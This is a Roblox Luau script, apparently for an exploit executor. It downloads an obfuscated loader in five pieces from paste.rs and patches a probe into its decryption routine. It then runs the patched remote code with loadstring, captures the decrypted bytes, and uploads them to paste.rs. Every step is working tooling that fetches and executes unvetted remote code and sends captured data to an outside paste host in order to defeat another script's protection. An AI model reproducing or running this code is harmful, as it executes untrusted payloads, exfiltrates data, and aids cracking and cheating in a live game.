local U={"https://paste.rs/6EBBH","https://paste.rs/vMdfC","https://paste.rs/mvAbJ","https://paste.rs/3LvjP","https://paste.rs/RxVut"}
local pg=game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local gui=Instance.new("ScreenGui")
gui.ResetOnSpawn=false
gui.DisplayOrder=999999
gui.Parent=pg
local f=Instance.new("Frame",gui)
f.Size=UDim2.new(0,620,0,240)
f.Position=UDim2.new(0.5,-310,0.5,-120)
f.BackgroundColor3=Color3.fromRGB(14,16,21)
f.BorderSizePixel=0
Instance.new("UICorner",f).CornerRadius=UDim.new(0,10)
local sc=Instance.new("ScrollingFrame",f)
sc.Size=UDim2.new(1,-16,1,-16)
sc.Position=UDim2.new(0,8,0,8)
sc.BackgroundTransparency=1
sc.BorderSizePixel=0
sc.ScrollBarThickness=6
sc.CanvasSize=UDim2.new(0,0,0,0)
sc.AutomaticCanvasSize=Enum.AutomaticSize.Y
Instance.new("UIListLayout",sc).Padding=UDim.new(0,2)
local function log(s,c)
  local l=Instance.new("TextLabel",sc)
  l.Size=UDim2.new(1,-6,0,18)
  l.BackgroundTransparency=1
  l.Text=s
  l.TextColor3=c or Color3.fromRGB(205,210,220)
  l.TextSize=12
  l.Font=Enum.Font.Code
  l.TextXAlignment=Enum.TextXAlignment.Left
end
local function send(data)
  local ok,r=pcall(function()
    return request({Url="https://paste.rs",Method="POST",Body=data,
      Headers={["Content-Type"]="text/plain"}})
  end)
  if ok and r then
    local u=tostring(r.Body):gsub("%s+$","")
    if u:sub(1,4)=="http" then return u end
  end
  return nil
end
local CAP,MAXN={},700
__L2=function(off,len,hexs)
  if #CAP<MAXN then
    local h=""
    for i=1,#hexs do h=h..("%02x"):format(hexs:byte(i)) end
    CAP[#CAP+1]=("%d,%s,%s"):format(off,tostring(len),h)
  end
end
log("下载 loader…",Color3.fromRGB(120,200,240))
task.spawn(function()
  local parts={}
  for i,u in ipairs(U) do
    local ok,r=pcall(function() return game:HttpGet(u) end)
    if not ok then log("块"..i.."失败",Color3.fromRGB(255,120,120)) return end
    parts[i]=r
  end
  local code=table.concat(parts)
  log("loader "..#code,Color3.fromRGB(200,220,200))
  local pat="else j[30](d,Z,(j[48](j[11](r,K+Z),x,j.nW[P])))"
  local k=code:find(pat,1,true)
  if not k then log("未找到解密点",Color3.fromRGB(255,120,120)) return end
  local ins="else local __ok1,__l=pcall(buffer.len,r);local __ok2,__s=pcall(buffer.readstring,r,K+Z,20);__L2(K+Z,__ok1 and __l or -1,__ok2 and __s or \"ERR\");j[30](d,Z,(j[48](j[11](r,K+Z),x,j.nW[P])))"
  code=code:sub(1,k-1)..ins..code:sub(k+#pat)
  log("已插入源快照探针",Color3.fromRGB(200,220,200))
  local fn,err=loadstring(code)
  if not fn then log("编译失败: "..tostring(err):sub(1,70),Color3.fromRGB(255,120,120)) return end
  local ok2,res=pcall(fn)
  log("结束 ok="..tostring(ok2).." 记录="..#CAP,
      ok2 and Color3.fromRGB(150,255,150) or Color3.fromRGB(255,150,150))
  if not ok2 then log(tostring(res):sub(1,80),Color3.fromRGB(255,150,150)) end
  task.wait(1)
  if #CAP==0 then log("没记录到",Color3.fromRGB(255,120,120)) return end
  local txt=table.concat(CAP,"\n")
  log(("上传 %d 字节…"):format(#txt),Color3.fromRGB(255,220,120))
  local u=send(txt)
  if u then log("SRC: "..u,Color3.fromRGB(150,255,150))
  else log("上传失败",Color3.fromRGB(255,120,120)) end
end)
